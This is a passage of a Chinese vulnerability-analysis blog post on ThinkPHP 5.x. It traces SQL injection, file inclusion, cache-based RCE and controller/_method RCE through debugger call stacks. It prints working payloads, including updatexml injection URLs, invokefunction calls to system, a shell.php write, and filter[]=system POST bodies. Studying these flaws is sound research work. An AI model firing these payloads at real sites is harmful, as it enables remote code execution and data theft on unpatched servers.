+    &#125;
+</code></pre>
+<p>和5.1.8版本对比，发现<code>parseArrayData</code>被删除</p>
+<p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230704212600933.png" alt="image-20230704212600933"></p>
+<p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230704214735175.png" alt="image-20230704214735175"></p>
+<p>很明显的看到上面的parseArrayData是存在直接拼接</p>
+<p>传参数调试一下password&#x3D;123，直接在<code>parseData</code>进行断点调试，</p>
+<pre><code>update()--&gt;update()--parseDate()
+</code></pre>
+<p>不难发现，传入参数不是数组，不能进入switch case里面</p>
+<p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230704215003689.png" alt="image-20230704215003689"></p>
+<p>所以修改传入的参数</p>
+<pre><code>password[0]=1&amp;password[1]=2&amp;password[2]=3
+</code></pre>
+<p>修改控制器为</p>
+<pre><code class="php">public function index()
+    &#123;
+        $password = request()-&gt;get(&#39;password/a&#39;);
+        db(&#39;test&#39;)-&gt;where([&#39;name&#39; =&gt; &#39;bb&#39;])-&gt;update([&#39;password&#39; =&gt; $password]);
+        return &#39;Update success&#39;;
+    &#125;
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230704215334783.png" alt="image-20230704215334783"></p>
+<p>成功进入parseArrayData,跟进</p>
+<pre><code>update()--&gt;update()--parseDate()-parseArrayData()
+</code></pre>
+<p>来到了<code>think/db/builder/Mysql.php</code>的Mysql类，因为这个类继承了Builder类</p>
+<p>来到这里，发现<code>$type</code>必须为<code>point</code>才能进行后续的拼接</p>
+<p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230704215814024.png" alt="image-20230704215814024"></p>
+<p>修改传参,因为后面存在第4位数组，所以加多一位</p>
+<pre><code class="php">?password[0]=point&amp;password[1]=2&amp;password[2]=3&amp;password[3]=4
+</code></pre>
+<p>拼接后得到结果</p>
+<p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230704220500238.png" alt="image-20230704220500238"></p>
+<p>返回到</p>
+<pre><code>update()--&gt;update()
+</code></pre>
+<p>查看生成的sql语句</p>
+<p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230704220818501.png" alt="image-20230704220818501"></p>
+<p>可以对password这部分内容进行构造注入</p>
+<pre><code>http://127.0.0.1/index.php?password[0]=point&amp;password[1]=1&amp;password[2]=updatexml(1,concat(0x7,user(),0x7e),1)^&amp;password[3]=0
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230704221119912.png" alt="image-20230704221119912"></p>
+<p>构造的sql语句为</p>
+<pre><code>&quot;UPDATE `test`  SET `password` = updatexml(1,concat(0x7,user(),0x7e),1)^(&#39;0(1)&#39;)  WHERE  `name` = :where_AND_name  &quot;
+</code></pre>
+<h3 id="5-1-6-parseWhereItem方法注入"><a href="#5-1-6-parseWhereItem方法注入" class="headerlink" title="5.1.6 parseWhereItem方法注入"></a>5.1.6 parseWhereItem方法注入</h3><p>影响版本： <strong>ThinkPHP5全版本</strong> </p>
+<p>控制器</p>
+<pre><code class="php">public function index()
+    &#123;
+        $username = request()-&gt;get(&#39;username&#39;);
+        $result = db(&#39;users&#39;)-&gt;where(&#39;username&#39;,$username)-&gt;select();
+        var_dump($result);
+        return &#39;select success&#39;;
+    &#125;
+</code></pre>
+<p>传入参数调试</p>
+<pre><code>username=admin
+</code></pre>
+<p>先进入select(),前面是对参数进行一些分析和处理，里面再调用$this-&gt;connection-&gt;select()</p>
+<pre><code>select()--&gt;connection.select()
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230705091038039.png" alt="image-20230705091038039"></p>
+<p>跟进查看</p>
+<p>找到生成sql语句的地方，在</p>
+<pre><code>think\db\Builder-&gt;select()
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230705091228734.png" alt="image-20230705091228734"></p>
+<p>跟进</p>
+<pre><code>select()--&gt;connection.select()--&gt;Builder.select()
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230705091445089.png" alt="image-20230705091445089"></p>
+<p>跟进这个 <strong>where</strong> 分析函数<code>parseWhere</code>，会发现其会调用生成查询条件 <strong>SQL</strong> 语句的 <strong>buildWhere</strong> 函数。</p>
+<pre><code>select()--&gt;connection.select()--&gt;Builder.select()--&gt;parseWhere()
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230705091702418.png" alt="image-20230705091702418"></p>
+<p>跟进</p>
+<pre><code>select()--&gt;connection.select()--&gt;Builder.select()--&gt;parseWhere()--&gt;buildWhere()
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230705091957133.png" alt="image-20230705091957133"></p>
+<p> 程序会运行到parseWhereItem where子单元分析函数，继续跟进查看</p>
+<pre><code>select()--&gt;connection.select()--&gt;Builder.select()--&gt;parseWhere()--&gt;buildWhere()--&gt;parseWhereItem()
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230705094323968.png" alt="image-20230705094323968"></p>
+<p>关键点就在这里，这里会根据不同的表达式进入不同的函数，</p>
+<p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230705094549091.png" alt="image-20230705094549091"></p>
+<p>如果$exp&#x3D;EXP,那么就会进入<code>parseExp</code></p>
+<p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230705094719384.png" alt="image-20230705094719384"></p>
+<p>修改控制器</p>
+<pre><code class="php">public function index()
+    &#123;
+        $username = request()-&gt;get(&#39;username&#39;);
+        $result = db(&#39;users&#39;)-&gt;where(&#39;username&#39;,&#39;exp&#39;,$username)-&gt;select();
+        return &#39;select success&#39;;
+    &#125;
+</code></pre>
+<p>这里会出现直接拼接</p>
+<p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230705094831120.png" alt="image-20230705094831120"></p>
+<p>返回的结果</p>
+<p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230705094903839.png" alt="image-20230705094903839"></p>
+<p>层层返回，查看目前生成的sql</p>
+<p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230705095045212.png" alt="image-20230705095045212"></p>
+<p>然后根据这个sql进行拼接</p>
+<pre><code>http://127.0.0.1/?username=)%20union%20select%20updatexml(1%2cconcat(0x7e,database()%2c0x7e)%2c1)%23%20 
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230705095305304.png" alt="image-20230705095305304"></p>
+<p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230705095331293.png" alt="image-20230705095331293"></p>
+<h3 id="5-1-22-parseOrder方法注入"><a href="#5-1-22-parseOrder方法注入" class="headerlink" title="5.1.22  parseOrder方法注入"></a><strong>5.1.22</strong>  parseOrder方法注入</h3><p>影响版本： <strong>5.1.16&lt;&#x3D;ThinkPHP5&lt;&#x3D;5.1.22</strong></p>
+<pre><code>composer create-project --prefer-dist topthink/think=5.1.22 thinkphp-5.1.22
+</code></pre>
+<p>控制器：</p>
+<pre><code class="php">public function index()
+    &#123;
+        $orderby = request()-&gt;get(&#39;orderby&#39;);
+        $result = db(&#39;users&#39;)-&gt;where([&#39;username&#39; =&gt; &#39;admin&#39;])-&gt;order($orderby)-&gt;find();
+        var_dump($result);
+    &#125;
+</code></pre>
+<p>官方修复：添加了<code>)</code>和<code>#</code>检查</p>
+<p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230705103055992.png" alt="image-20230705103055992"></p>
+<p>调试，运行到解析函数parseOrder</p>
+<pre><code>?orderby=id--&gt;select()
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230705111300943.png" alt="image-20230705111300943"></p>
+<p>跟进</p>
+<pre><code>?orderby=id--&gt;select()--&gt;parseOrder()
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230705111503580.png" alt="image-20230705111503580"></p>
+<p>先判断<code>$order</code>是不是为空，就是传入的字符id</p>
+<p>然后把它当数组，获取key和val</p>
+<p>因为<code>key</code>是数字<code>0</code>,运行到	<code>list(...)=...</code></p>
+<p>大概是根据空格将字符串分开，变为数组</p>
+<p>然后这里就是关键的地方</p>
+<p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230705112056553.png" alt="image-20230705112056553"></p>
+<p>正常来说，<code>sort</code>获取的是order by的排序方式，先把它转为大写，再判断是否在数组里，再拼接</p>
+<p>查看生成的sql语句</p>
+<pre><code>SELECT * FROM `users` WHERE  `username` = :where_AND_username ORDER BY `id` LIMIT 1  
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230705112813823.png" alt="image-20230705112813823"></p>
+<p>因为没有过滤，可以尝试再id输入这里构造注入</p>
+<pre><code>orderby=id`,updatexml(1,concat(0x7e,database(),0x7e),1)%23
+</code></pre>
+<p>发现这里出现了问题</p>
+<p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230705113050691.png" alt="image-20230705113050691"></p>
+<p>传入的值在当成数组使用时被分割，以逗号分隔开，最后拼接的只有id&#96;</p>
+<p>如果把传入的值本身就是一个数组就能够解决这个问题</p>
+<pre><code>?orderby[]=id`,updatexml(1,concat(0x7e,database(),0x7e),1)%23
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230705113417373.png" alt="image-20230705113417373"></p>
+<p>最后拼接的结果</p>
+<pre><code>SELECT * FROM `users` WHERE  `username` = :where_AND_username ORDER BY `id`,updatexml(1,concat(0x7e,database(),0x7e),1)#` LIMIT 1  
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230705113500270.png" alt="image-20230705113500270"></p>
+<p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230705113706760.png" alt="image-20230705113706760"></p>
+<h3 id="5-0-10-cacheFile变量文件包含"><a href="#5-0-10-cacheFile变量文件包含" class="headerlink" title="5.0.10 cacheFile变量文件包含"></a>5.0.10 cacheFile变量文件包含</h3><p>控制器：</p>
+<pre><code class="php">&lt;?php
+namespace app\index\controller;
+use think\Controller;
+class Index extends Controller
+&#123;
+    public function index()
+    &#123;
+        $this-&gt;assign(request()-&gt;get());
+        return $this-&gt;fetch(); // 当前模块/默认视图目录/当前控制器（小写）/当前操作（小写）.html
+    &#125;
+&#125;
+</code></pre>
+<p>创建 <strong>application&#x2F;index&#x2F;view&#x2F;index&#x2F;index.html</strong> 文件，内容随意（没有这个模板文件的话，在渲染时程序会报错）</p>
+<p>官方发布的更新：</p>
+<p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230705130446570.png" alt="image-20230705130446570"></p>
+<p>查看这个文件的对应位置<code>template/driver/File.php</code></p>
+<p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230705130632625.png" alt="image-20230705130632625"></p>
+<p>发现这里可能会存在变量覆盖–&gt;extract(),<code>EXTR_OVERWRITE</code>模式是默认值，如果有冲突，则覆盖已有的变量</p>
+<p>如果 <strong>$cacheFile</strong>可控，将导致文件包含漏洞出现</p>
+<p>随便传入参数调试</p>
+<p>调用栈：</p>
+<pre><code>File.php:45, think\template\driver\File-&gt;read()
+Template.php:200, think\Template-&gt;fetch()
+Think.php:84, think\view\driver\Think-&gt;fetch()
+View.php:163, think\View-&gt;fetch()
+Controller.php:120, think\Controller-&gt;fetch()
+Index.php:31, app\index\controller\Index-&gt;index()
+App.php:343, ReflectionMethod-&gt;invokeArgs()
+App.php:343, think\App::invokeMethod()
+App.php:595, think\App::module()
+App.php:457, think\App::exec()
+App.php:139, think\App::run()
+start.php:19, require()
+index.php:17, &#123;main&#125;()
+</code></pre>
+<p>到这个read（）函数</p>
+<p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230705132612535.png" alt="image-20230705132612535"></p>
+<p>$var是传入的get参数，这里是数组</p>
+<p>然后进入if,执行了extract()函数，使得这个数组变为: $a&#x3D;1</p>
+<p>因为这里的$cacheFile前面控制不了，可以在这里进行变量覆盖修改它的值</p>
+<p>传参数试试：</p>
+<pre><code>?cacheFile=123
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230705133509895.png" alt="image-20230705133509895"></p>
+<p>成功修改</p>
+<p>在<strong>public</strong> 目录下写一个phpinfo.php试试，因为网站根目录是这</p>
+<p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230705133824031.png" alt="image-20230705133824031"></p>
+<p>也可以使用绝对路径</p>
+<h3 id="5-0-10-cache缓存函数远程代码执行"><a href="#5-0-10-cache缓存函数远程代码执行" class="headerlink" title="5.0.10 cache缓存函数远程代码执行"></a>5.0.10 cache缓存函数远程代码执行</h3><p>控制器：</p>
+<pre><code class="php">&lt;?php
+namespace app\index\controller;
+use think\Cache;
+class Index
+&#123;
+    public function index()
+    &#123;
+       Cache::set(&quot;name&quot;,input(&quot;get.username&quot;));
+       return Cache::get(&#39;name&#39;);
+    &#125;
+&#125;
+</code></pre>
+<p>官方修改：<br><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230705140742143.png" alt="image-20230705140742143"></p>
+<p>可以看到官方为了不让用户构造的数据执行，在前面加上了exit();</p>
+<p>本版本的代码如下</p>
+<pre><code class="php">public function set($name, $value, $expire = null)
+    &#123;
+        if (is_null($expire)) &#123;
+            $expire = $this-&gt;options[&#39;expire&#39;];
+        &#125;
+        $filename = $this-&gt;getCacheKey($name);
+        if ($this-&gt;tag &amp;&amp; !is_file($filename)) &#123;
+            $first = true;
+        &#125;
+        $data = serialize($value);
+        if ($this-&gt;options[&#39;data_compress&#39;] &amp;&amp; function_exists(&#39;gzcompress&#39;)) &#123;
+            //数据压缩
+            $data = gzcompress($data, 3);
+        &#125;
+        $data   = &quot;&lt;?php\n//&quot; . sprintf(&#39;%012d&#39;, $expire) . $data . &quot;\n?&gt;&quot;;
+        $result = file_put_contents($filename, $data);
+        if ($result) &#123;
+            isset($first) &amp;&amp; $this-&gt;setTagItem($filename);
+            clearstatcache();
+            return true;
+        &#125; else &#123;
+            return false;
+        &#125;
+    &#125;
+</code></pre>
+<p>直接在这下断点调试</p>
+<p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230705142607510.png" alt="image-20230705142607510"></p>
+<p>红色方框处是获取文件名，和绝对路径</p>
+<p>看一下，文件名生成规则：</p>
+<pre><code class="php">protected function getCacheKey($name)
+    &#123;
+        $name = md5($name);
+        if ($this-&gt;options[&#39;cache_subdir&#39;]) &#123;
+            // 使用子目录
+            $name = substr($name, 0, 2) . DS . substr($name, 2);
+        &#125;
+        if ($this-&gt;options[&#39;prefix&#39;]) &#123;
+            $name = $this-&gt;options[&#39;prefix&#39;] . DS . $name;
+        &#125;
+        $filename = $this-&gt;options[&#39;path&#39;] . $name . &#39;.php&#39;;
+        $dir      = dirname($filename);
+        if (!is_dir($dir)) &#123;
+            mkdir($dir, 0755, true);
+        &#125;
+        return $filename;
+    &#125;
+</code></pre>
+<p>然后再将传入的数据，即缓存数据进行序列化</p>
+<p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230705142924210.png" alt="image-20230705142924210"></p>
+<p>这里的 <strong>$this-&gt;options[‘data_compress’]</strong> 变量默认情况下为 <strong>false</strong> ，所以数据不会经过 <strong>gzcompress</strong> 函数处理。</p>
+<p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230705143449734.png" alt="image-20230705143449734"></p>
+<p>然后就是进行代码拼接，拼接的是序列化后的值，写入刚刚生成的php文件，虽然在序列化数据前面拼接了单行注释符 <strong>&#x2F;&#x2F;</strong> ，但是我们可以通过注入换行符绕过该限制。</p>
+<p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230705143101908.png" alt="image-20230705143101908"></p>
+<p>所以构造poc, 其中%0d%0a是回车符和换行符 </p>
+<pre><code>?username=123%0d%0aphpinfo();//
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230705144448553.png" alt="image-20230705144448553"></p>
+<h3 id="远程代码执行（1）"><a href="#远程代码执行（1）" class="headerlink" title="远程代码执行（1）"></a>远程代码执行（1）</h3><p>该漏洞存在于 ThinkPHP 底层没有对控制器名进行很好的合法性校验，导致在未开启强制路由的情况下，用户可以调用任意类的任意方法，最终导致 远程代码执行漏洞 的产生</p>
+<h4 id="5-0-7-lt-x3D-ThinkPHP5-lt-x3D-5-0-22"><a href="#5-0-7-lt-x3D-ThinkPHP5-lt-x3D-5-0-22" class="headerlink" title="5.0.7&lt;&#x3D;ThinkPHP5&lt;&#x3D;5.0.22"></a>5.0.7&lt;&#x3D;ThinkPHP5&lt;&#x3D;5.0.22</h4><p>测试环境5.0.10</p>
+<p>5.0.23官方修复：添加了对控制器名的检查</p>
+<p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230705152558263.png" alt="image-20230705152558263"></p>
+<p>在默认的情况下，可以使用路由兼容模式 <strong>s</strong> 参数，访问控制器内容</p>
+<p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230705153739024.png" alt="image-20230705153739024"></p>
+<p>例如：</p>
+<pre><code> http://site/?s=模块/控制器/方法/参数/参数值
+</code></pre>
+<p>断点调试</p>
+<pre><code>http://127.0.0.1/?s=index/index/index
+</code></pre>
+<pre><code>run()
+</code></pre>
+<p>在这个方法里调用了 routeCheck进行了路由检查 </p>
+<p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230705163740925.png" alt="image-20230705163740925"></p>
+<p>跟进</p>
+<pre><code>run()--&gt;routeCheck()
+</code></pre>
+<p>到了这里，这个方法对s传入的控制器&#x2F;方法&#x2F;参数进行解析</p>
+<p>这里用了<code>/</code>对传入的字符串进行分割</p>
+<p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230705163934153.png" alt="image-20230705163934153"></p>
+<p>分割后得到</p>
+<p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230705164451952.png" alt="image-20230705164451952"></p>
+<p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230705164508469.png" alt="image-20230705164508469"></p>
+<p>解析完这个后返回到run()</p>
+<p>调用了exec()</p>
+<p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230705164623977.png" alt="image-20230705164623977"></p>
+<p>跟进</p>
+<pre><code>run()--&gt;exec()
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230705164738354.png" alt="image-20230705164738354"></p>
+<p>继续跟进</p>
+<pre><code>run()--&gt;exec()--&gt;module()
+</code></pre>
+<p>这里可以看到官方修改的部分</p>
+<p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230705165150186.png" alt="image-20230705165150186"></p>
+<p>这里是根据刚刚那个划分出来的数组进行分别处理，[1]为控制器，[2]为操作名</p>
+<p>后面的就是调用这个控制器对应的操作</p>
+<p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230705165406310.png" alt="image-20230705165406310"></p>
+<p>整个过程下来，没有对控制器名进行任何检查，可以调用任意控制器的任意方法（已经加载的类）</p>
+<p>下面的是可以利用的</p>
+<pre><code>?s=index/think\config/get&amp;name=database.username # 获取配置信息
+?s=index/\think\Lang/load&amp;file=../../test.jpg    # 包含任意文件
+?s=index/\think\Config/load&amp;file=../../t.php     # 包含任意.php文件
+?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=id  #执行系统命令
+</code></pre>
+<h4 id="5-1-0-lt-x3D-ThinkPHP-lt-x3D-5-1-30"><a href="#5-1-0-lt-x3D-ThinkPHP-lt-x3D-5-1-30" class="headerlink" title="5.1.0&lt;&#x3D;ThinkPHP&lt;&#x3D;5.1.30"></a>5.1.0&lt;&#x3D;ThinkPHP&lt;&#x3D;5.1.30</h4><p>测试环境5.1.30</p>
+<p>5.1.31官方修复：</p>
+<p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230705153155297.png" alt="image-20230705153155297"></p>
+<p>这个版本的和上面5.0.x版本漏洞是差不多的,也是没有对控制器名进行检查</p>
+<p>调试</p>
+<pre><code>?s=index/index/index
+</code></pre>
+<p>run()方法先进行初始化，然后调用<code>routeCheck()</code></p>
+<p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230705184502066.png" alt="image-20230705184502066"></p>
+<p>跟进</p>
+<pre><code>run() --&gt; routeCheck()
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230705184732894.png" alt="image-20230705184732894"></p>
+<p>在这里获取到s传来的参数，即 模块&#x2F;控制器&#x2F;方法</p>
+<p>然后调用check(),对路由进行处理</p>
+<p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230705184934238.png" alt="image-20230705184934238"></p>
+<p>跟进</p>
+<pre><code>run() --&gt; routeCheck() --&gt;check()
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230705185130881.png" alt="image-20230705185130881"></p>
+<p>在这里，路由的<code>/</code>被替换成’<code>| </code> ,即变成<code>index|index|index</code></p>
+<p>来到<code>think/route/dispatch/Module.php</code></p>
+<pre><code>run() --&gt; init() --&gt;init()
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230705185855493.png" alt="image-20230705185855493"></p>
+<p>这里解析出控制器名和操作名</p>
+<p>接下来就是实例化然后执行</p>
+<pre><code>think\route\dispatch\Module-&gt;exec()
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230705190032330.png" alt="image-20230705190032330"></p>
+<p>整个过程中没有对控制器名进行检查，从而导致该漏洞</p>
+<p>可利用的控制器：</p>
+<pre><code>?s=index/\think\Request/input&amp;filter[]=system&amp;data=pwd
+?s=index/\think\view\driver\Php/display&amp;content=&lt;?php phpinfo();?&gt;
+?s=index/\think\template\driver\file/write&amp;cacheFile=shell.php&amp;content=&lt;?php phpinfo();?&gt;
+?s=index/\think\Container/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=id
+?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=id
+</code></pre>
+<h3 id="远程代码执行（2）"><a href="#远程代码执行（2）" class="headerlink" title="远程代码执行（2）"></a>远程代码执行（2）</h3><h4 id="5-0-0-lt-x3D-ThinkPHP5-lt-x3D-5-0-23-and-5-1-0-lt-x3D-ThinkPHP-lt-x3D-5-1-30"><a href="#5-0-0-lt-x3D-ThinkPHP5-lt-x3D-5-0-23-and-5-1-0-lt-x3D-ThinkPHP-lt-x3D-5-1-30" class="headerlink" title="5.0.0&lt;&#x3D;ThinkPHP5&lt;&#x3D;5.0.23 and 5.1.0&lt;&#x3D;ThinkPHP&lt;&#x3D;5.1.30"></a>5.0.0&lt;&#x3D;ThinkPHP5&lt;&#x3D;5.0.23 and 5.1.0&lt;&#x3D;ThinkPHP&lt;&#x3D;5.1.30</h4><p>5.0.23分析</p>
+<p>5.0.23版本对比5.0.24，官方修改了Request类，添加了对请求方法的检查</p>
+<p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230705191618791.png" alt="image-20230705191618791"></p>
+<p>可以很明显的看出 <code>$method</code> 来自可控的 <code>$_POST</code>数组，而且在获取之后没有进行任何检查，直接把它作为 <code>Request</code> 类的方法进行调用，同时，该方法传入的参数是可控数据 <code>$_POST</code>。也就相当于可以随意调用 <code>Request</code> 类的部分方法。</p>
+<p>这个method()方法在解析路由的过程中调用</p>
+<p>调用栈如下</p>
+<pre><code class="tex">Request.php:507, think\Request-&gt;method()
+Route.php:848, think\Route::check()
+App.php:632, think\App::routeCheck()
+App.php:116, think\App::run()
+start.php:19, require()
+index.php:17, &#123;main&#125;()
+</code></pre>
+<p>在method()方法中</p>
+<pre><code class="php">public function method($method = false)
+    &#123;
+        if (true === $method) &#123;
+            // 获取原始请求类型
+            return $this-&gt;server(&#39;REQUEST_METHOD&#39;) ?: &#39;GET&#39;;
+        &#125; elseif (!$this-&gt;method) &#123;
+            if (isset($_POST[Config::get(&#39;var_method&#39;)])) &#123;
+                $this-&gt;method = strtoupper($_POST[Config::get(&#39;var_method&#39;)]);
+                $this-&gt;&#123;$this-&gt;method&#125;($_POST);
+            &#125; elseif (isset($_SERVER[&#39;HTTP_X_HTTP_METHOD_OVERRIDE&#39;])) &#123;
+                $this-&gt;method = strtoupper($_SERVER[&#39;HTTP_X_HTTP_METHOD_OVERRIDE&#39;]);
+            &#125; else &#123;
+                $this-&gt;method = $this-&gt;server(&#39;REQUEST_METHOD&#39;) ?: &#39;GET&#39;;
+            &#125;
+        &#125;
+        return $this-&gt;method;
+    &#125;
+</code></pre>
+<p>关键点在</p>
+<p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230705195700446.png" alt="image-20230705195700446"></p>
+<p><code>Config::get(&#39;var_method&#39;)</code>是获取配置文件中的<code>var_method</code>的值，</p>
+<p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230705200127564.png" alt="image-20230705200127564"></p>
+<p>检查是否POST了参数<code>_method</code>,然后获取POST来的_method的值，转成大写，然后将这个值当成函数去执行，该函数的参数是<code>$_POST</code></p>
+<p>也就是POST的所有数据</p>
+<p>这里的下一个目标是，在这个类中找到一个可以利用的方法，而且是有参方法</p>
+<p>这里找到的是<code>__construct</code></p>
+<pre><code class="php">protected function __construct($options = [])
+    &#123;
+        foreach ($options as $name =&gt; $item) &#123;
+            if (property_exists($this, $name)) &#123;
+                $this-&gt;$name = $item;
+            &#125;
+        &#125;
+        if (is_null($this-&gt;filter)) &#123;
+            $this-&gt;filter = Config::get(&#39;default_filter&#39;);
+        &#125;
+
+        // 保存 php://input
+        $this-&gt;input = file_get_contents(&#39;php://input&#39;);
+    &#125;
+</code></pre>
+<p>这段代码很关键</p>
+<p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230705202147580.png" alt="image-20230705202147580"></p>
+<p>这里会检查<code>$this</code>对象或类是否具有<code>$name</code>属性,如果有，将给这个属性赋值为<code>$item</code>，这给后面利用带来许多操作空间</p>
+<p>该类有许多属性,现在要利用哪个还不确定</p>
+<pre><code class="php">protected $get                  protected static $instance;
+protected $post                 protected $method;
+protected $request              protected $domain;
+protected $route                protected $url;
+protected $put;                 protected $baseUrl;
+protected $session              protected $baseFile;
+protected $file                 protected $root;
+protected $cookie               protected $pathinfo;
+protected $server               protected $path;
+protected $header               protected $routeInfo 
+protected $mimeType             protected $env;
+protected $content;             protected $dispatch 
+protected $filter;              protected $module;
+protected static $hook          protected $controller;
+protected $bind                 protected $action;
+protected $input;               protected $langset;
+protected $cache;               protected $param   
+protected $isCheckCache;    
+</code></pre>
+<p>如果框架在配置文件中开启了 <code>debug</code> 模式（ <code>&#39;app_debug&#39;=&gt; true</code> ），程序会调用<code>Request</code> 类的 <code>param</code> 方法。这个方法我们需要特别关注了，因为 <code>Request</code> 类中的 <code>param、route、get、post、put、delete、patch、request、session、server、env、cookie、input</code> 方法均调用了 <code>filterValue</code>  方法，而该方法中就存在可利用的 <code>call_user_func</code>函数。</p>
+<p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230705204938325.png" alt="image-20230705204938325"></p>
+<p>跟进 <code>param</code> 方法。发现其调用 <code>method</code> 方法。其会调用 server方法</p>
+<p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230705213056585.png" alt="image-20230705213056585"></p>
+<p>在 server 方法中把 $this-&gt;server传入了 input 方法 ,这个 $this-&gt;server的值，我们可以通过先前 Request类的 <code>__construct </code>方法来覆盖赋值</p>
+<p>可控数据作为 $data 传入 input 方法</p>
+<p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230705213226503.png" alt="image-20230705213226503"></p>
+<p>跟进input</p>
+<p> $data会被 filterValue 方法使用 $filter 过滤器处理。其中 $filter的值部分来自$this-&gt;filter ，又是可以通过先前Request 类的<code>__construct</code>方法来覆盖赋值。</p>
+<p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230705213513687.png" alt="image-20230705213513687"></p>
+<p>接下来就是 filterValue方法调用call_user_func处理数据的过程，代码执行就是发生在这里</p>
+<p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230705213543908.png" alt="image-20230705213543908"></p>
+<p>所以再开启了Debug后的exp是：</p>
+<pre><code>POST /
+_method=__construct&amp;filter[]=system&amp;server[REQUEST_METHOD]=whoami
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230705214402354.png" alt="image-20230705214402354"></p>
+<p>还有许多调用链,而且不同版本会有所不同,原理都是一样的</p>
+<pre><code># ThinkPHP &lt;= 5.0.13
+POST /?s=index/index
+s=whoami&amp;_method=__construct&amp;method=&amp;filter[]=system
+
+# ThinkPHP &lt;= 5.0.23、5.1.0 &lt;= 5.1.16 需要开启框架app_debug
+POST /
+_method=__construct&amp;filter[]=system&amp;server[REQUEST_METHOD]=ls -al
+
+# ThinkPHP &lt;= 5.0.23 需要存在xxx的method路由，例如captcha
+POST /?s=xxx HTTP/1.1
+_method=__construct&amp;filter[]=system&amp;method=get&amp;get[]=ls+-al
+_method=__construct&amp;filter[]=system&amp;method=get&amp;server[REQUEST_METHOD]=ls
+</code></pre>
+<h3 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h3><h4 id="5-0-x"><a href="#5-0-x" class="headerlink" title="5.0.x"></a>5.0.x</h4><h5 id="高版本（5-0-24）"><a href="#高版本（5-0-24）" class="headerlink" title="高版本（5.0.24）"></a>高版本（5.0.24）</h5><p>控制器</p>
+<pre><code class="php">&lt;?php
+namespace app\index\controller;
+
+class Index
+&#123;
+    public function index()
+    &#123;
+        $c = unserialize($_GET[&#39;c&#39;]);
+        var_dump($c);
+        return &#39;Welcome to thinkphp5.0.24&#39;;
+    &#125;
+&#125;
+</code></pre>
+<p>反序列化第一步，先找<code>__destruct()</code></p>
